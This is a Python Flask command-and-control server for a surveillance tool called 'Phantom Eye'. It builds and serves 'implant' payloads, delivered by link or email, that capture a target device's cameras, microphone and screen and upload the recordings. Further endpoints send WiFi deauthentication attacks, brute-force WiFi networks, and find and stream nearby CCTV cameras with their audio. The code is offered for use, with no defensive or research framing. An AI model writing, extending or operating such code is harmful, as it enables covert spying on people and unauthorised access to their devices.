import os
import json
from io import BytesIO
import time
from gevent import monkey
monkey.patch_all()

from flask import Flask, render_template, jsonify, request, send_from_directory, Response
from flask_socketio import SocketIO, emit
from config import Config
from scanner import DeviceScanner
from implant_builder import ImplantBuilder
from signaling import StreamManager
from cam_scanner import CamScanner
from cam_streamer import CamStreamer
from audio_streamer import AudioStreamer
from wifi_hopper import WiFiHopper

Config.init()

app = Flask(__name__, template_folder="../templates", static_folder="../static")
app.config["SECRET_KEY"] = Config.SECRET_KEY
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="gevent")

scanner = DeviceScanner(Config.INTERFACE)
stream_mgr = StreamManager(Config.CAPTURE_DIR, socketio=socketio)
implants = {}  # mac -> implant_data
cam_scanner = CamScanner()
cam_streamer = CamStreamer(socketio)
audio_streamer = AudioStreamer()
wifi_hopper = WiFiHopper(Config.INTERFACE)

# ──────────── Pages ────────────

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/cam")
def cam_page():
    return render_template("cam.html")

@app.route("/device/<mac>")
def device_page(mac):
    mac = mac.replace("-", ":")
    dev = scanner.get_device(mac)
    if not dev:
        dev = {"mac": mac, "vendor": "Unknown", "signal": 0, "type": "unknown",
               "first_seen": time.time(), "implant_status": "none", "access": {},
               "ssids": [], "associated_ap": None, "is_cctv": False, "is_streaming": False}
    imp = implants.get(mac)
    return render_template("device.html", device=dev, implant=imp)

@app.route("/viewer/<mac>")
def viewer_page(mac):
    mac = mac.replace("-", ":")
    dev = scanner.get_device(mac)
    if not dev:
        dev = {"mac": mac, "vendor": "Unknown", "signal": 0, "type": "unknown",
               "first_seen": time.time(), "implant_status": "none", "access": {},
               "ssids": [], "associated_ap": None, "is_cctv": False, "is_streaming": False}
    imp = implants.get(mac)
    return render_template("viewer.html", device=dev, implant=imp)

@app.route("/i/<implant_id>")
def serve_implant(implant_id):
    """Serve implant payload to target"""
    for mac, imp in implants.items():
        if imp["implant_id"] == implant_id:
            return imp["html"], 200, {"Content-Type": "text/html"}
    return "Not Found", 404

# ──────────── API ────────────

@app.route("/api/devices")
def api_devices():
    return jsonify(scanner.get_devices())

@app.route("/api/networks")
def api_networks():
    return jsonify(scanner.get_networks())

@app.route("/api/device/<mac>")
def api_device(mac):
    mac = mac.replace("-", ":")
    dev = scanner.get_device(mac)
    imp = implants.get(mac)
    status = None
    if imp:
        status = stream_mgr.get_implant_status(imp["implant_id"])
    return jsonify({"device": dev, "implant": imp, "status": status})

@app.route("/api/deploy", methods=["POST"])
def api_deploy():
    data = request.json
    mac = data.get("mac")
    features = data.get("features", ["camera_front", "camera_back", "microphone", "screen"])

    # Get server IP
    import netifaces
    server_ip = "127.0.0.1"
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if 2 in addrs:
            for addr in addrs[2]:
                ip = addr["addr"]
                if not ip.startswith("127."):
                    server_ip = ip
                    break
            if server_ip != "127.0.0.1":
                break

    payload = ImplantBuilder.build_payload(mac, server_ip, features)
    implants[mac] = payload

    # Update device
    with scanner.lock:
        if mac in scanner.devices:
            scanner.devices[mac]["implant_status"] = "deployed"

    return jsonify({
        "status": "deployed",
        "implant_id": payload["implant_id"],
        "delivery_url": payload["delivery_url"],
        "email_payload": payload["email_payload"]
    })

@app.route("/api/implant/checkin", methods=["POST"])
def implant_checkin():
    data = request.json
    iid = stream_mgr.register_checkin(data)
    mac = data.get("mac")

    with scanner.lock:
        if mac in scanner.devices:
            scanner.devices[mac]["implant_status"] = "active"
            for s in data.get("streams", []):
                if "cam_front" in s:
                    scanner.devices[mac]["access"]["camera_front"] = True
                if "cam_back" in s:
                    scanner.devices[mac]["access"]["camera_back"] = True
                if "mic" in s:
                    scanner.devices[mac]["access"]["microphone"] = True
                if "screen" in s:
                    scanner.devices[mac]["access"]["screen"] = True

    socketio.emit("implant_active", {"mac": mac, "data": data})
    return jsonify({"ok": True})

@app.route("/api/implant/stream", methods=["POST"])
def implant_stream():
    chunk = request.files.get("chunk")
    stream_name = request.form.get("stream")
    implant_id = request.form.get("id")
    mac = request.form.get("mac")

    if chunk and implant_id:
        path = stream_mgr.save_chunk(implant_id, stream_name, chunk.read())
        return jsonify({"ok": True, "path": path})
    return jsonify({"ok": False}), 400

@app.route("/api/implant/photo", methods=["POST"])
def implant_photo():
    photo = request.files.get("photo")
    stream_name = request.form.get("stream")
    implant_id = request.form.get("id")
    mac = request.form.get("mac")

    if photo and implant_id:
        path = stream_mgr.save_chunk(implant_id, f"photo_{stream_name}", photo.read())
        socketio.emit("new_photo", {"mac": mac, "path": path, "stream": stream_name})
        return jsonify({"ok": True, "path": path})
    return jsonify({"ok": False}), 400

@app.route("/api/command", methods=["POST"])
def api_command():
    data = request.json
    socketio.emit("command", data)
    return jsonify({"ok": True})

@app.route("/api/deauth", methods=["POST"])
def api_deauth():
    data = request.json
    mac = data.get("mac")
    ap = data.get("ap") # Optional, scanner will try to find if not provided
    success = scanner.send_deauth(mac, ap)
    return jsonify({"success": success})

@app.route("/api/captures/<iid>/<filename>")
def serve_capture(iid, filename):
    return send_from_directory(os.path.join(Config.CAPTURE_DIR, iid), filename)

@app.route("/api/implant/heartbeat", methods=["POST"])
def implant_heartbeat():
    data = request.json
    stream_mgr.heartbeat(data.get("id"), data.get("stream"))
    return jsonify({"ok": True})

# ──────────── Camera Discovery API ────────────

@app.route("/api/cam/scan", methods=["POST"])
def api_cam_scan():
    import gevent
    def run_scan():
        def cb(event, data):
            if event == "status":
                socketio.emit("cam_scan_status", data)
            elif event == "camera_found":
                socketio.emit("cam_found", data)
            elif event == "scan_complete":
                socketio.emit("cam_scan_complete", data)
            elif event == "error":
                socketio.emit("cam_scan_error", data)
        cam_scanner.scan_network(callback=cb)
    gevent.spawn(run_scan)
    return jsonify({"ok": True, "subnet": cam_scanner.subnet})

@app.route("/api/cam/stream", methods=["POST"])
def api_cam_stream():
    cam_info = request.json
    import gevent
    gevent.spawn(cam_streamer.start_stream, cam_info)
    return jsonify({"ok": True})

@app.route("/api/cam/stop", methods=["POST"])
def api_cam_stop():
    ip = request.json.get("ip")
    cam_streamer.stop_stream(ip)
    return jsonify({"ok": True})

@app.route("/api/cam/snapshot", methods=["POST"])
def api_cam_snapshot():
    ip = request.json.get("ip")
    cam_info = cam_scanner.cameras.get(ip)
    if not cam_info:
        return jsonify({"error": "Camera not found"}), 404
    frame = cam_streamer.snapshot(cam_info)
    if frame:
        return jsonify({"frame": frame})
    return jsonify({"error": "Could not capture frame"}), 500

@app.route("/api/cam/list")
def api_cam_list():
    return jsonify(cam_scanner.get_cameras())

@app.route("/api/cam/mjpeg/<path:ip>")
def api_cam_mjpeg(ip):
    """Direct MJPEG stream — lowest latency, no Socket.IO overhead"""
    if not cam_streamer.is_streaming(ip):
        return "Stream not active", 404
    return Response(
        cam_streamer.mjpeg_generator(ip),
        mimetype='multipart/x-mixed-replace; boundary=frame',
        headers={'Cache-Control': 'no-cache', 'Connection': 'keep-alive'}
    )

@app.route("/api/cam/add", methods=["POST"])
def api_cam_add():
    """Manually add a camera by IP (for cameras on other networks)"""
    data = request.json
    ip = data.get("ip")
    port = int(data.get("port", 554))
    user = data.get("user", "admin")
    passwd = data.get("password", "")
    path = data.get("path", "/")

    if not ip:
        return jsonify({"error": "IP required"}), 400

    # Build RTSP URL
    if user and passwd:
        rtsp_url = f"rtsp://{user}:{passwd}@{ip}:{port}{path}"
    elif user:
        rtsp_url = f"rtsp://{user}@{ip}:{port}{path}"
    else:
        rtsp_url = f"rtsp://{ip}:{port}{path}"

    cam_info = {
        "ip": ip,
        "ports": [port],
        "has_rtsp": True,
        "has_http": False,
        "rtsp_url": rtsp_url,
        "http_url": None,
        "authenticated": bool(passwd),
        "creds": f"{user}:{passwd}" if passwd else None,
        "vendor": "Manual",
        "status": "manual",
    }

    with cam_scanner.lock:
        cam_scanner.cameras[ip] = cam_info

    return jsonify({"ok": True, "camera": cam_info})

# ──────────── Audio Streaming API ────────────

@app.route("/api/cam/audio/<path:ip>")
def api_cam_audio(ip):
    """Stream audio from camera as MP3 via FFmpeg"""
    cam = cam_scanner.cameras.get(ip)
    if not cam or not cam.get("rtsp_url"):
        return "No RTSP stream for this camera", 404
    return Response(
        audio_streamer.audio_generator(ip, cam["rtsp_url"]),
        mimetype='audio/mpeg',
        headers={'Cache-Control': 'no-cache', 'Connection': 'keep-alive'}
    )

@app.route("/api/cam/audio/stop/<path:ip>", methods=["POST"])
def api_cam_audio_stop(ip):
    audio_streamer.stop_audio(ip)
    return jsonify({"ok": True})

# ──────────── WiFi Hopping API ────────────

@app.route("/api/wifi/networks")
def api_wifi_networks():
    """List nearby WiFi networks"""
    networks = wifi_hopper.scan_networks()
    return jsonify(networks)

@app.route("/api/wifi/current")
def api_wifi_current():
    """Get current WiFi connection info"""
    return jsonify(wifi_hopper.get_current())

@app.route("/api/wifi/connect", methods=["POST"])
def api_wifi_connect():
    """Connect to a WiFi network"""
    data = request.json
    ssid = data.get("ssid")
    password = data.get("password", "")
    if not ssid:
        return jsonify({"ok": False, "error": "SSID required"}), 400
    result = wifi_hopper.connect(ssid, password)
    return jsonify(result)

@app.route("/api/wifi/autoconnect", methods=["POST"])
def api_wifi_autoconnect():
    """Auto-connect to a WiFi network (bruteforce/open)"""
    data = request.json
    ssid = data.get("ssid")
    if not ssid:
        return jsonify({"ok": False, "error": "SSID required"}), 400
    result = wifi_hopper.auto_connect(ssid)
    return jsonify(result)

@app.route("/api/wifi/hopandscan", methods=["POST"])
def api_wifi_hopandscan():
    """Connect to WiFi network and immediately scan for cameras on it"""
    data = request.json
    ssid = data.get("ssid")
    password = data.get("password")
    if not ssid:
        return jsonify({"ok": False, "error": "SSID required"}), 400

    # Step 1: Connect (auto or with password)
    if password is not None:
        conn = wifi_hopper.connect(ssid, password)
    else:
        conn = wifi_hopper.auto_connect(ssid)

    if not conn.get("ok"):
        return jsonify({"ok": False, "error": f"Connection failed: {conn.get('error', 'unknown')}"})

    # Step 2: Re-detect subnet on the new network
    import time
    time.sleep(2)  # wait for DHCP
    cam_scanner.subnet = cam_scanner._detect_subnet()

    # Step 3: Scan for cameras on new network
    cams = cam_scanner.scan_network()

    return jsonify({
        "ok": True,
        "ssid": ssid,
        "ip": conn.get("ip", ""),
        "subnet": cam_scanner.subnet,
        "cameras_found": len(cams),
        "cameras": list(cam_scanner.cameras.values())
    })

@app.route("/api/wifi/disconnect", methods=["POST"])
def api_wifi_disconnect():
    """Disconnect from current WiFi"""
    return jsonify(wifi_hopper.disconnect())

@app.route("/api/wifi/reconnect", methods=["POST"])
def api_wifi_reconnect():
    """Reconnect to original WiFi network"""
    return jsonify(wifi_hopper.reconnect_original())

if __name__ == '__main__':
    scanner.start()
    
    cert = Config.CERTFILE if os.path.exists(Config.CERTFILE) else None
    key = Config.KEYFILE if os.path.exists(Config.KEYFILE) else None
    
    ssl_context = None
    if cert and key:
        import ssl
        # Optimized context for self-signed certificates
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(certfile=cert, keyfile=key)
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
    
    print(f"[*] Starting Phantom Eye on https://{Config.HOST}:{Config.PORT}")
    
    # Suppress noisy SSL handshake errors from gevent due to self-signed certs
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    from gevent.pywsgi import WSGIHandler
    class QuietHandler(WSGIHandler):
        def log_error(self, msg, *args):
            if "SSLV3_ALERT_CERTIFICATE_UNKNOWN" in str(msg) or "handshake" in str(msg).lower():
                return
            super().log_error(msg, *args)
            
    # Disable reloader for gevent stability
    socketio.run(app, debug=False, port=Config.PORT, host=Config.HOST, ssl_context=ssl_context)